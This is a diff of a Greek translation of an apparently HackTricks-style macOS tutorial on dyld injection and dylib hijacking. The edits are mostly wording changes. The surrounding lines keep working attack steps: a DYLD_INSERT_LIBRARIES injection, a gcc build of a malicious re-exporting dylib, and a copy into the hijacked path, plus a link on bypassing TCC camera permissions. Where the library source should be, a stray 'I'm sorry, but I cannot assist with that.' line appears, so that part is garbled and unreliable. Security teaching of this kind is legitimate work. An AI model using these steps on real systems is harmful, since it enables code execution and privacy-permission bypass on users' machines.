@@ -37,9 +37,9 @@ return 0;
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
-## Dyld Hijacking Example
+## Παράδειγμα Dyld Hijacking
 
-Ο στοχευμένος ευάλωτος δυαδικός είναι το `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
+Ο στοχευμένος ευάλωτος δυαδικός κώδικας είναι το `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 {{#tabs}}
 {{#tab name="entitlements"}}
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Έτσι, είναι δυνατόν να το αναλάβετε! Δημιουργήστε μια βιβλιοθήκη που **εκτελεί κάποιο αυθαίρετο κώδικα και εξάγει τις ίδιες λειτουργίες** με τη νόμιμη βιβλιοθήκη επαναεξάγοντας την. Και θυμηθείτε να την μεταγλωττίσετε με τις αναμενόμενες εκδόσεις:
+Έτσι, είναι δυνατόν να το αναλάβετε! Δημιουργήστε μια βιβλιοθήκη που **εκτελεί κάποιο αυθαίρετο κώδικα και εξάγει τις ίδιες λειτουργίες** με τη νόμιμη βιβλιοθήκη επανεξάγοντας την. Και θυμηθείτε να την μεταγλωττίσετε με τις αναμενόμενες εκδόσεις:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -104,7 +104,7 @@ I'm sorry, but I cannot assist with that.
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
-Η διαδρομή επανεξαγωγής που δημιουργείται στη βιβλιοθήκη είναι σχετική με τον φορτωτή, ας την αλλάξουμε σε απόλυτη διαδρομή προς τη βιβλιοθήκη για εξαγωγή:
+Ο δρόμος επανεξαγωγής που δημιουργείται στη βιβλιοθήκη είναι σχετικός με τον φορτωτή, ας τον αλλάξουμε σε απόλυτο δρόμο προς τη βιβλιοθήκη για εξαγωγή:
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
@@ -121,7 +121,7 @@ cmd LC_REEXPORT_DYLIB
 cmdsize 128
 name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-Τέλος, απλώς αντιγράψτε το στη **hijacked location**:
+Τέλος, απλώς αντιγράψτε το στην **κατεχόμενη τοποθεσία**:
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
@@ -133,7 +133,7 @@ cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 </code></pre>
 
 > [!NOTE]
-> Μια ωραία περιγραφή για το πώς να εκμεταλλευτείτε αυτήν την ευπάθεια για να εκμεταλλευτείτε τις άδειες κάμερας του telegram μπορεί να βρεθεί στο [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+> Μια ωραία ανάλυση σχετικά με το πώς να εκμεταλλευτείτε αυτήν την ευπάθεια για να εκμεταλλευτείτε τις άδειες κάμερας του telegram μπορεί να βρεθεί στο [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 
 ## Μεγαλύτερη Κλίμακα
 
